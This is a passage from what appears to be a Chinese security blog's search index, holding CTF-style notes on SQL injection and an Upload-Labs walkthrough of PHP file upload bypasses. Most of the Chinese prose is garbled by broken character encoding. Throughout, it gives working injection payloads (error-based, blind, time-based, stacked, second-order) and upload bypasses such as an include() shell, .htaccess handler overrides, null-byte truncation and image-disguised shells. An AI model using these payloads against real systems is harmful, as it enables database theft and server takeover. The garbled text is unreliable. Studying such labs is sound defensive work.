updatexml(ç›®æ ‡æ–‡ä»¶, è·¯å¾„, æ›´æ”¹å€¼); è€Œè¿™é‡Œçš„è·¯å¾„å¿…é¡»æ˜¯ XPath æ ¼å¼çš„è·¯å¾„ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¼ å…¥éæ³•è·¯å¾„ï¼ˆä½†æ˜¯æ˜¯ä¸€ä¸ªåˆç†çš„ sql è¯­å¥ï¼‰ï¼Œæ¥è®© updatexml æŠ¥é”™ï¼Œæ˜¾ç¤ºè·¯å¾„ä¸­ sql è¯­å¥æ‰§è¡Œåçš„å†…å®¹ï¼Œè€Œç›®æ ‡æ–‡ä»¶ä¸æ›´æ”¹å€¼å¯ä»¥æ˜¯ä»»æ„å†…å®¹ 11' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x776562313030322d32)),3) %23 è€Œç°åœ¨çš„ç›®çš„æ˜¯ä¸ºäº†è®©ä¼ å…¥çš„è·¯å¾„ä¸ç¬¦åˆ XPath è·¯å¾„æ ¼å¼ï¼Œé‚£å°±å¿…é¡»åŠ ä¸€ä¸ªè®©è·¯å¾„æ ¼å¼å¤±æ•ˆçš„å­—ç¬¦ï¼Œâ€™#â€™æˆ–è€…â€™~â€™(0x7e)éƒ½è¡Œ æ‰€ä»¥ç°åœ¨è¦ç”¨åˆ° concat()å‡½æ•°æ¥å°†é‚£ä¸ªå­—ç¬¦ä¸åé¢çš„è¯­å¥æ‹¼æ¥èµ·æ¥ extractvalue()ä¸ updatexml()åŒç† floor() ä¸ rand()éšæœºæ•°å‡½æ•°ç»“åˆï¼Œfloor()ç”¨äºå–æ•´https://blog.csdn.net/zpy1998zpy/article/details/80650540https://www.cnblogs.com/litlife/p/8472323.html 0x03.å¯ä»¥ä½¿ç”¨è¯­å¥è¾…åŠ©æ³¨å…¥substr(str,start,long)str æ˜¯å¾…åˆ‡åˆ†çš„å­—ç¬¦ä¸²ï¼Œstart æ˜¯åˆ‡åˆ†èµ·å§‹ä½ç½®(ä¸‹æ ‡ä» 1 å¼€å§‹)ï¼Œlong æ˜¯åˆ‡åˆ†é•¿åº¦ if(exp1,exp2,exp3)å¦‚æœæ»¡è¶³ exp1,é‚£ä¹ˆæ‰§è¡Œ exp2,å¦åˆ™æ‰§è¡Œ exp3 ä¾‹å¦‚ï¼š 1xx' or if((substr((select database()),1,1)='c'),1,0) # #åˆ¤æ–­æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸ºc è¯­å¥æ›¿æ¢å¦‚æœé€—å·è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ”¶å‘æ›¿æ¢ if(exp1, exp2, exp3) ====&gt; case when exp1 then exp2 else exp3 end substr(exp1,1, 1) ====&gt; substr(exp1) from 1 for 1 ä¾‹å¦‚ï¼š 1xx' or case when (substr((select database()) from 1 for 1)='c') then 1 else 0 end # å¦‚æœ substr è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨ LOCATE å‡½æ•° è¿”å›å­ä¸² substr åœ¨å­—ç¬¦ä¸² str ä¸­çš„ç¬¬ p os ä½ç½®åç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚å¦‚æœ substr ä¸åœ¨ str ä¸­è¿”å› 0 psï¼šå› ä¸º[[Mysql]]å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œæ‰€æœ‰å†™çš„æ—¶å€™ç”¨ locate(binaryâ€™Sâ€™, str, 1) åŠ ä¸ª binary å³å¯ 12xx' or if((locate(binary'c',(select database()),1)=1),1,0) #xx' or if((locate(binary't',(select database()),1)=2),1,0) # 0x04.ä½¿ç”¨å»¶è¿Ÿæ³¨å…¥123456789åŸºäºsleepçš„å»¶è¿Ÿ xx' or if(length((select database()))&gt;1,sleep(5),1) #åŸºäºç¬›å¡å°”ä¹˜ç§¯è¿ç®—æ—¶é—´é€ æˆçš„æ—¶é—´å»¶è¿Ÿxx' or if(length((select database()))&gt;1,(select count(*) FROM information_schema.columns A,information_schema.columns p B,information_schema.columns C),1) # åŸºäºbenchmarkçš„å»¶è¿Ÿ xx'or if(length((select database()))&gt;1,(select BENCHMARK(10000000,md5('a'))),1) #--å¤§æ¦‚ä¼šç”¨2Sæ—¶é—´ 0x05.å †å æ³¨å…¥ å¦‚æœèƒ½çœ‹è§æºç ï¼Œæºç ä¸­æœ‰ multi_query()é‚£å°±å¾ˆæœ‰å¯èƒ½æ¶‰åŠå †å æ³¨å…¥ åªè¦æ˜¯å †å æ³¨å…¥ï¼Œé‚£å°±å¯ä»¥ä½¿ç”¨ sql çš„é¢„å®šä¹‰è¯­å¥ 12345678å³åœ¨'åç›´æ¥è·Ÿåˆ†å·ç»“æŸï¼Œç„¶åè·Ÿsqlè¯­å¥ï¼Œæœ€å#æ”¶å°¾-1';show databases;#-1';show tables;#-1';show columns from `1919810931114514`;#-1';show columns from `words`;##æ³¨æ„ï¼Œä»¥ä¸Šè¡¨åè¦åŠ åå¼•å·``ï¼Œåå¼•å·å†…çš„å†…å®¹å¯ä»¥è¢«ä½œä¸ºå­å‘½ä»¤åœ¨å…¶ä»–å‘½ä»¤ä¸­åµŒå¥—è¾“å‡º#ä¾‹å¦‚ï¼šping www.google.com == ping `www.google.com` å¦‚æœå¯ä»¥ä½¿ç”¨å †å æ³¨å…¥ï¼Œä½†æ˜¯æœ‰ä¸€äº›å…³é”®å­—è¢«è¿‡æ»¤äº†(ä¾‹å¦‚ select)é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨é¢„ç¼–è¯‘çš„æ–¹æ³• set ç”¨äºè®¾ç½®å˜é‡åå’Œå€¼ prepare ç”¨äºé¢„å¤‡ä¸€ä¸ªè¯­å¥ï¼Œå¹¶èµ‹äºˆåç§°ï¼Œä»¥åå¯ä»¥å¼•ç”¨è¯¥è¯­å¥execute æ‰§è¡Œè¯­å¥deallocate prepare ç”¨æ¥é‡Šæ”¾æ‰é¢„å¤„ç†çš„è¯­å¥ ä¾‹å¦‚ payload: 1-1';set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;execute stmt;# 0x06.æ›´æ”¹è¡¨ååˆ—åä¸ºæœ¬èº«å°±èƒ½å›æ˜¾çš„æ¥æŸ¥è¯¢è¯­æ³•å¦‚ä¸‹ï¼š 12345ä¿®æ”¹è¡¨å(å°†è¡¨åuseræ”¹ä¸ºusers)alter table user rename to users;ä¿®æ”¹åˆ—å(å°†å­—æ®µåusernameæ”¹ä¸ºname)alter table users change uesrname name varchar(30); ä¾‹å¦‚ payload: 11'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);# ä¿®æ”¹å®Œåï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ä¸‡èƒ½å¯†ç å¾—å‡º flagï¼š 11' or 1=1# 0x07.äºŒæ¬¡æ³¨å…¥å³é€šè¿‡æŸç§æ–¹å¼å¾—åˆ°æºç åï¼Œå‘ç°ç¨‹åºå¯¹è¾“å…¥çš„åœ°æ–¹åšäº†è¿‡æ»¤ï¼ˆæ¯”æ–¹è¯´è½¬ä¹‰ addslashsï¼‰ï¼Œä½†æ˜¯é€šè¿‡æ³¨å†Œå­˜åˆ°æ•°æ®åº“é‡Œçš„å†…å®¹å´æ˜¯ä¸å¸¦ \\ çš„ã€‚è€Œå½“æˆ‘ä»¬å†å»ä¿®æ”¹å¯†ç æ—¶ï¼Œä¿®æ”¹çš„å´æ˜¯ä¹‹å‰æ³¨å†Œçš„æ¶æ„ä»£ç é‡ŒçœŸæ­£ç”¨æˆ·çš„å¯†ç ï¼Œä¾‹å¦‚ï¼š 12345æ³¨å†Œæ—¶æˆ‘ä»¬æ³¨å†Œadmin'#ä½†æ˜¯å­˜å‚¨æ—¶ï¼Œç¨‹åºåŠ äº†\\ï¼Œå˜æˆäº†admin\\'#ä½†æ˜¯åœ¨å½“æˆ‘ä»¬ç”¨è¿™ä¸ªadmin'#ç™»å½•åå»ä¿®æ”¹å¯†ç æ—¶ï¼Œå†…éƒ¨çš„sqlå¦‚ä¸‹æ„é€ $sql = &quot;UPDATE users SET PASSWORD='123' where username='admin'#'and password='$curr_pass'&quot;å³æˆ‘ä»¬ç›¸å½“äºæ˜¯ä¿®æ”¹äº†adminçš„å¯†ç  ç›²æ³¨åŸç†121' and sleep(5)# 1' and length(database())=2# å› æ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥ä¸€èˆ¬æ³¨å…¥çš„ select æ²¡ç”¨ï¼Œæ•…é€šè¿‡ and æˆ–è€…åˆ«çš„æ–¹å¼æŸ¥è¯¢æ—¶åŠ ä¸Šä¸€äº›ç‰¹å®šå‡½æ•°ï¼Œæ¥ä¸€ä¸ªä¸€ä¸ªçˆ†ç ´çŒœè§£æ•°æ®åº“çš„æŸä¸ªå­—æ®µçš„å­—ç¬¦å¯ä»¥ä½¿ç”¨ Burpsuite æˆ–è€…äºŒåˆ†æ³•æ¥å®šä½å­—ç¬¦ æ“ä½œåŸºäºæ—¶é—´ï¼š sleep() if() 12345678çŒœè¡¨çš„æ•°é‡ï¼š1' and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(5),1)#çŒœè¡¨åå­—ç¬¦æ•°ï¼š1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1)# çŒœè¡¨åç¬¬ä¸€ä¸ªå­—ç¬¦ï¼š1' and if(ascii(substr((select table_name from table_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97,sleep(5),1)# åŸºäºå¸ƒå°”ï¼š length() ascii() mid() substr() count() 1234567891011121314çŒœè¡¨çš„æ•°é‡ï¼š1' and (select count(table_name) from information_schema.tables where table_schema=database())=1#çŒœè¡¨é•¿åº¦ï¼š1' and (select length(table_name) from information_schema.tables where table_schema=database())=1#limit i,n é™åˆ¶è¿”å›ç»“æœçš„æ•°é‡i:è¿”å›ç»“æœçš„ç´¢å¼•å€¼n:è¿”å›ç»“æœçš„æ•°é‡çŒœè¡¨åç¬¬ä¸€ä¸ªå­—ç¬¦ï¼š1' and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),0,1))&gt;97#","link":"/2019/12/11/sql%E6%B3%A8%E5%85%A5/"},{"title":"ä» php ä»£ç å±‚é¢åˆ†ææ–‡ä»¶ä¸Šä¼ æ¼æ´","text":"ä» PHP ä»£ç å±‚é¢åˆ†ææ–‡ä»¶ä¸Šä¼ æ¼æ´ æ ¹æ® Upload-Labs æ¥è¿›è¡Œæ€»ç»“ 0x00.å‚è€ƒæ–‡ç«  upload-labs æ–‡ä»¶ä¸Šä¼ é¶æœºé—¯å…³è®°å½• Upload-labs é€šå…³æ‰‹å†Œ å¦‚æœ shell å†™çš„æ˜¯å›æ˜¾å‹ï¼ˆphpinfo()ï¼‰æˆ–è€…æ˜¯ä¸ªå›¾ç‰‡ï¼Œéœ€è¦é€šè¿‡å¦ä¸€ä¸ª[[æ–‡ä»¶åŒ…å«æ¼æ´]]æ¼æ´æ‰“ç»„åˆæ‹³ï¼Œæˆ–è€…å°†ä»¥ä¸‹åŒ…å«ä»£ç ä¼ ä¸Šå» 1234&lt;?php$b = $_GET['a'];include($b);?&gt; 0x01.ä»å®¢æˆ·ç«¯ JS å»é™åˆ¶æ–‡ä»¶æ‰©å±•åï¼ˆæœ¬åœ°æ ¡éªŒï¼‰ä»£ç 1234567891011121314151617function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;); return false; } //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ var allow_ext = &quot;.jpg|.png|.gif&quot;; //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼  if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) { var errMsg = &quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot; + allow_ext + &quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot; + ext_name; alert(errMsg); return false; }} Bypass åˆ é™¤å…³é”®ç™½åå• JS ä»£ç ç‰‡æ®µ åœ¨ç™½åå•é‡ŒåŠ å…¥æ¶æ„æ‰©å±•å 0x02.æ£€æŸ¥æ•°æ®åŒ…çš„ MIMEï¼ˆæ–‡ä»¶ç±»å‹ï¼‰ä»£ç 123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { //è¿™ä¸€æ®µ if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) { //è¿™ä¸€æ®µ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } else { $msg = 'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼'; } } else { $msg = UPLOAD_PATH.'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; }}å³ä½¿ç”¨$_FILES['upload_file']['type'] == 'image/jpeg'æ¥è¿›è¡Œæ•°æ®åŒ…ä¼ è¾“çš„é™åˆ¶ Bypass ä»…å°†æ•°æ®åŒ…ä¸­çš„ Content-Type ä¿®æ”¹ä¸ºåˆæ³•ç±»å‹ï¼Œæ–‡ä»¶æ‰©å±•åä¸å˜ 0x03.å¯¹æ‰©å±•åè¿›è¡Œé»‘åå•é™åˆ¶ æ¨¡æ¿ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { //é»‘åå•è§„åˆ™éƒ¨åˆ† $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);//è¿›è¡Œé»‘åå•é™åˆ¶ $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);//å¯¹æ¶æ„æ‰©å±•åè¿›è¡Œæ›¿æ¢æ“ä½œ //é»‘åå•è§„åˆ™éƒ¨åˆ† if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } else { $msg = 'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼'; } } else { $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; }} 1.è§„åˆ™-æ‰©å±•åè¿›è¡Œé»‘åå•é™åˆ¶ä»£ç 1$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); Bypass ä½¿ç”¨ä¸€äº›åˆ«åï¼Œä¾‹å¦‚ php åˆ™å¯ä»¥ä½¿ç”¨ php2php3php4php5phpsphtphtmphtml ä½¿ç”¨ Apache çš„.htaccess è§„åˆ™ é€šè¿‡æ„é€ å½“å‰ç½‘é¡µé…ç½®æ–‡ä»¶.htaccessåˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸º.htaccess çš„æ–‡ä»¶ï¼Œä¿å­˜æ ¼å¼ä¸º eXtensible Markup Language fileå†…å®¹ä¸ºï¼š 123456&lt;FilesMatch &quot;cimer&quot;&gt; //cimerå¯ä»¥æ›¿æ¢ä¸ºè‡ªå·±æƒ³è¦çš„æ‰©å±•åï¼ŒåæœŸæ”¹è¿™ä¸ªæ‰©å±•åä¸Šä¼ å°±å¥½äº†SetHandler application/x-httpd-php&lt;/FilesMatch&gt;å°†.htaccessä¸Šä¼ åˆ°æŒ‡å®šé¡µé¢ä¸­ï¼ˆå®ƒæ˜¯é…ç½®æ–‡ä»¶ï¼Œæ‰€ä»¥ä¸ä¼šè¢«æ‹¦æˆªï¼‰ï¼Œç„¶åå°†è‡ªå·±çš„.phpä»£ç æ›´æ”¹æ‰©å±•ååä¸º.cimerï¼ˆè‡ªå·±èµ·çš„é‚£ä¸ªï¼‰ä¸Šä¼  èœåˆ€è¿æ¥æ—¶åŒæ ·è®¿é—®è¿™ä¸ª****.cimerå°±å¥½ã€‚ ä½¿ç”¨ Apache ä»å³å‘å·¦è§£æçš„è§„åˆ™ ä¸Šä¼  1.php.bak æˆ–è€…ä»»æ„ä¸€ä¸ªç¼–é€ çš„æ‰©å±•ååœ¨æŸäº›ç‰ˆæœ¬å¯å½“åš php æ¥æ‰§è¡Œï¼ˆå› ä¸º apache ä»å³åˆ°å·¦å¯¹æ–‡ä»¶åè¿›è¡Œè§£æï¼Œè€Œ .bak æ˜¯ httpd.conf è¯†åˆ«ä¸äº†çš„æ–‡ä»¶åæ‰©å±•åï¼Œæ•… apache ä¼šè‡ªåŠ¨æå–å·¦è¾¹çš„.phpï¼‰ 2.è§„åˆ™-æ‰©å±•åå¤§å°å†™é™åˆ¶ä»£ç 1$file_ext = strtolower($file_ext);//è½¬æ¢ä¸ºå°å†™ Bypass å¦‚æœæ²¡æœ‰å¤§å°å†™é™åˆ¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ pHp æ¥è¿›è¡Œç»•è¿‡ 3.è§„åˆ™-æ‰©å±•åé¦–å°¾å»ç©ºä»£ç 1$file_ext = trim($file_ext);//å¯¹æ‰©å±•åè¿›è¡Œé¦–å°¾å»ç©ºæ“ä½œ Bypass å¦‚æœæ²¡æœ‰æ”¶å°¾å»ç©ºæ“ä½œï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨æ‰©å±•åååŠ ç©ºæ ¼è¿›è¡Œç»•è¿‡ 4.è§„åˆ™-åˆ é™¤æœ«å°¾çš„ç‚¹ä»£ç 1$file_name = deldot($file_name);//åˆ é™¤æœ«å°¾çš„ç‚¹ Bypass å¦‚æœæ²¡æœ‰åˆ é™¤æœ«å°¾çš„ç‚¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ 1.php.è¿›è¡Œç»•è¿‡ Windows ç¯å¢ƒä¸‹ä¼šè‡ªåŠ¨åˆ é™¤æœ€åçš„ç‚¹ 5.è§„åˆ™-è¿›è¡Œæ–‡ä»¶æµé™åˆ¶ä»£ç 1$file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA Bypass å¦‚æœæ²¡æœ‰è¿›è¡Œæ–‡ä»¶æµé™åˆ¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸Šä¼ æ–‡ä»¶åæ˜¯ 1.php::$DATA æ¥è¿›è¡Œç»•è¿‡ï¼ˆè®¿é—®æ—¶å»é™¤æ–‡ä»¶æµåç¼€ï¼‰ 1.php:1.txt æ˜¯æ­£å¸¸æ–‡ä»¶æµï¼Œè€Œ:$DATA æ˜¯å½“å‰æ–‡ä»¶é»˜è®¤æ–‡ä»¶æµ 6.è§„åˆ™-å¯¹æ¶æ„æ‰©å±•åè¿›è¡Œæ›¿æ¢ä»£ç 1$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);//å¯¹æ¶æ„æ‰©å±•åè¿›è¡Œæ›¿æ¢æ“ä½œ Bypass æ³¨æ„ï¼Œå³ä¾¿æœ‰è¿™æ ·çš„æ›¿æ¢æ“ä½œï¼Œæˆ‘ä»¬ä¾æ—§å¯ä»¥ä½¿ç”¨åŒå†™è¿›è¡Œç»•è¿‡ 0x04.ä¸Šä¼ è·¯å¾„å¯æ§1.é€šè¿‡ GET æ–¹å¼æ§åˆ¶ï¼ˆURLï¼‰ä»£ç 123456index.php&lt;form action=&quot;?save_path=../upload/&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;&lt;!--å°±æ˜¯è¿™é‡Œçš„?save_path=--&gt; &lt;p&gt;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„å›¾ç‰‡ï¼š&lt;p&gt; &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt; &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot;/&gt;&lt;/form&gt; Bypassï¼ˆ%00 æˆªæ–­ï¼‰ å¦‚æœè·¯å¾„å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä¸Šä¼ ä¸€ä¸ªæœ‰ä¸€å¥è¯çš„åˆæ³•ç±»å‹æ–‡ä»¶ï¼ˆJPG/GIF ç­‰ï¼‰ ç„¶åæˆ‘ä»¬åœ¨å¯æ§åˆ¶è·¯å¾„çš„åœ°æ–¹ä½¿ç”¨%00 æˆªæ–­ï¼Œå…·ä½“æ“ä½œæ“ä½œä¾‹å¦‚å°†è·¯å¾„æ›´æ¢ä¸ºä½ è¦ä¸Šä¼ é©¬çš„è·¯å¾„åŠ ä¸Š php æ–‡ä»¶åï¼š../upload/1.php%00 ç„¶åä¸Šä¼ ä¸Šå»å°±æ˜¯ 1.php,åŸå…ˆçš„ jpg ä¸ä¼šè¢«ä¸Šä¼  2.é€šè¿‡ POST æ–¹å¼æ§åˆ¶ä»£ç 1234567index.php&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt; &lt;p&gt;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„å›¾ç‰‡ï¼š&lt;p&gt; &lt;input type=&quot;hidden&quot; name=&quot;save_path&quot; value=&quot;../upload/&quot;/&gt; &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt; &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot;/&gt;&lt;/form&gt; Bypassï¼ˆ0x00 æˆªæ–­ï¼‰ å’Œ GET æ–¹å¼å¤§è‡´ç›¸ä¼¼ï¼Œä½†åœ¨å¯æ§è·¯å¾„ä¸Šæ·»åŠ â€œä¸€ä¸ªç©ºæ ¼ä¸ aâ€ï¼š../upload/1.php a ç©ºæ ¼ä¸ a çš„ HEX åˆ†åˆ«æ˜¯ 20ã€61 å°† 20 æ”¹ä¸º 00ï¼Œå³å¯ç»•è¿‡ 0x05.æ£€æŸ¥å›¾ç‰‡å†…å®¹1.åªæ£€æŸ¥å¤´ä¸¤ä¸ªå­—èŠ‚ä»£ç 12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename){ $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //åªè¯»2å­—èŠ‚ fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode){ case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; } return $fileType;}$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown'){ $msg = &quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; } }} Bypass åªç”¨åœ¨ php æ–‡ä»¶å‰åŠ ä¸Šä¸€è¡Œæ ‡è¯† GIFï¼šGIF89aJPGï¼šff, d8ï¼ˆHEX é‡Œè¾¹ä¿®æ”¹ï¼‰PNGï¼š89 50 4e 47 0d 0a 1a 0aï¼ˆHEX é‡Œè¾¹ä¿®æ”¹ï¼‰ 2.é€šè¿‡ç‰¹åˆ«å‡½æ•°æ¥æ£€æŸ¥å›¾ç‰‡å†…å®¹åˆ©ç”¨ getimagesize()12345678910111213141516171819202122232425262728293031function isImage($filename){ $types = '.jpeg|.png|.gif'; if(file_exists($filename)){ $info = getimagesize($filename);//ä½¿ç”¨getimagesize()æ£€æŸ¥å›¾ç‰‡ $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0){ return $ext; }else{ return false; } }else{ return false; }}$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = &quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; } }} åˆ©ç”¨ exif_imagetype()1234567891011121314151617181920212223242526272829303132333435function isImage($filename){ //éœ€è¦å¼€å¯php_exifæ¨¡å— $image_type = exif_imagetype($filename);//é€šè¿‡exif_imagetype()æ¥æ£€æŸ¥å›¾ç‰‡å†…å®¹ switch ($image_type) { case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; }}$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = &quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; } }} Bypass åªç”¨ä¸Šä¼ ä¸ªåœ¨æœ«å°¾æœ‰åŠ  shell ä»£ç çš„å›¾ç‰‡é©¬å°±å¥½äº† 0x06.å°†ä¸Šä¼ 